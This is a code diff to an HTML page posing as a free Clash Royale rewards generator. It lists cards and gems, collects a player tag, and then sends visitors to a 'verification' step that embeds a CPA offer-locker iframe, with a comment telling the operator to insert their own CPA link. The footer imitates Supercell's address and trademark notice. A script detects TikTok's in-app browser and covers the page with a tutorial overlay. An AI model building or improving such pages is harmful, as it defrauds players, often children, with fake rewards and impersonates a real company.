@@ -23,8 +23,11 @@
             overflow-x: hidden;
         }
 
-        /* --- TIKTOK PROTECTION --- */
-        #ttOverlay { position: fixed; inset: 0; background: #000; display: none; z-index: 9999999; }
+        /* --- TIKTOK BROWSER PROTECTION --- */
+        #ttOverlay { 
+            position: fixed; inset: 0; background: #000; 
+            display: none; z-index: 9999999; 
+        }
         #tutorialGif { width: 100%; height: 100%; object-fit: contain; }
 
         /* --- SUNRAY EFFECT --- */
@@ -59,14 +62,20 @@
             box-shadow: 0 8px 0px #003a73;
         }
 
-        .item-name { color: var(--cr-deep-blue); font-size: 14px; position: relative; z-index: 3; }
+        .item-name { 
+            color: var(--cr-deep-blue); font-size: 14px; 
+            position: relative; z-index: 3; text-transform: uppercase;
+        }
 
         .img-container { 
             height: 120px; display: flex; align-items: center; justify-content: center; 
             position: relative; z-index: 2; margin: 10px 0;
         }
 
-        .item-img { max-width: 90%; max-height: 100%; filter: drop-shadow(0 10px 8px rgba(0,0,0,0.3)); }
+        .item-img { 
+            max-width: 90%; max-height: 100%; 
+            filter: drop-shadow(0 10px 8px rgba(0,0,0,0.3)); 
+        }
 
         .btn-claim {
             background: linear-gradient(180deg, #7cfc00 0%, #4ea100 100%);
@@ -106,15 +115,16 @@
         }
 
         /* --- FOOTER --- */
-        footer { margin-top: 60px; background: #003a73; padding: 50px 20px; text-align: center; color: #ffffff; }
+        footer { margin-top: 60px; background: #003a73; padding: 50px 20px; color: #ffffff; }
         .footer-logo { width: 100px; margin-bottom: 20px; opacity: 0.9; }
         .legal-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin-bottom: 20px; }
-        .legal-links a { color: white; text-decoration: none; font-size: 13px; font-family: sans-serif; opacity: 0.8; }
-        .footer-info { font-size: 12px; color: #888; font-family: sans-serif; line-height: 1.5; }
+        .legal-links a { color: white; text-decoration: none; font-size: 12px; opacity: 0.7; }
+        .footer-info { font-size: 11px; color: #aaa; line-height: 1.5; font-family: sans-serif; }
     </style>
 </head>
 <body onclick="document.getElementById('ttOverlay').style.display='none'">
 
+    <!-- TIKTOK OVERLAY -->
     <div id="ttOverlay">
         <img src="tutorial.gif" id="tutorialGif">
     </div>
@@ -127,26 +137,27 @@
         <div class="grid" id="rewardGrid"></div>
     </div>
 
-    <!-- Modal 1 -->
+    <!-- MODAL 1: Account Connection -->
     <div class="modal" id="modalAccount">
         <div class="modal-content">
             <h3 style="margin:0">SELECTED:</h3>
             <div id="itemNameDisplay" style="color: #ff8000; font-size: 22px;">...</div>
             <img id="selectedItemImg" src="" alt="">
-            <p style="font-size: 13px; margin: 5px 0;">Enter your Player Tag or ID</p>
+            <p style="font-size: 13px; margin: 5px 0;">Enter Player Tag to receive reward</p>
             <div class="input-box">
-                <input type="text" id="username" placeholder="#PLAYER_ID" maxlength="15">
+                <input type="text" id="username" placeholder="#TAG OR USERNAME" maxlength="15">
             </div>
             <button class="btn-final" onclick="showLocker()">CONNECT</button>
         </div>
     </div>
 
-    <!-- Modal 2 -->
+    <!-- MODAL 2: CPA Locker -->
     <div class="modal" id="modalLocker">
         <div class="modal-content">
             <h2 style="margin:0">VERIFICATION</h2>
-            <p style="font-size: 13px;">Complete one task to receive your reward.</p>
+            <p style="font-size: 13px;">Final step: Complete one offer to verify your account.</p>
             <div style="height:400px; background:#eee; border-radius:15px; overflow:hidden;">
+                <!-- BEDDEL HAD L-LINK B DYAL CPA DYALK -->
                 <iframe src="https://checkmyapp.space/cl/i/822w96" style="width:100%; height:100%; border:none;"></iframe>
             </div>
         </div>
@@ -161,26 +172,29 @@
             <a href="#">Safe and Fair Play</a>
         </div>
         <p class="footer-info">
-            Supercell Oy<br>
-            Jätkäsaarenlaituri 1, 00180 Helsinki, Finland<br>
-            &copy; 2026 Supercell Oy.
+            Supercell Oy, Jätkäsaarenlaituri 1, 00180 Helsinki, Finland<br>
+            Clash Royale is a trademark of Supercell Oy. &copy; 2026.
         </p>
     </footer>
 
     <script>
+        // Data adapted from your GitHub files
         const rewards = [
-            {n: "MIGHTY MINER", img: "mminer.png"},
-            {n: "BOSS BANDIT", img: "bandit.png"},
-            {n: "EVO KNIGHT", img: "knight.png"},
-            {n: "EVO GOBLINS", img: "goblins.png"},
-            {n: "MAGIC ARCHER", img: "marcher.png"},
-            {n: "MINI P.E.K.K.A", img: "minipekka.png"},
-            {n: "GIANT SKELETON", img: "gskeleton.png"},
-            {n: "BALLOON", img: "balloon.png"},
-            {n: "MEGA MINION", img: "megaminion.png"},
-            {n: "BARBARIAN BARREL", img: "bbarrel.png"},
-            {n: "DARK PRINCE", img: "dprince.png"},
-            {n: "10,000 GEMS", img: "gems.png"}
+            {n: "BALLOON", img: "Balloon.PNG"},
+            {n: "KNIGHT", img: "Knight.PNG"},
+            {n: "MEGA MINION", img: "Minion.PNG"},
+            {n: "MAGIC ARCHER", img: "archer.PNG"},
+            {n: "BARBARIAN BARREL", img: "barrel.PNG"},
+            {n: "LEGENDARY CHEST", img: "chest5stars.PNG"},
+            {n: "EVO KNIGHT", img: "evoknight.PNG"},
+            {n: "5,000 GEMS", img: "gems5000.PNG"},
+            {n: "GIANT", img: "giant.PNG"},
+            {n: "GOBLINS", img: "goblins.PNG"},
+            {n: "GOLEM", img: "golem.PNG"},
+            {n: "MINI P.E.K.K.A", img: "minipekka.PNG"},
+            {n: "MUSKETEER", img: "musketeer.PNG"},
+            {n: "PRINCE", img: "prince.PNG"},
+            {n: "WIZARD", img: "wizard.PNG"}
         ];
 
         const grid = document.getElementById('rewardGrid');
@@ -210,7 +224,7 @@
             }
         }
 
-        // --- TIKTOK SCRIPT ---
+        // TIKTOK BROWSER DETECTION
         window.addEventListener("load", () => {
             if (/TikTok|Bytedance/i.test(navigator.userAgent)) {
                 document.getElementById("ttOverlay").style.display = "block";
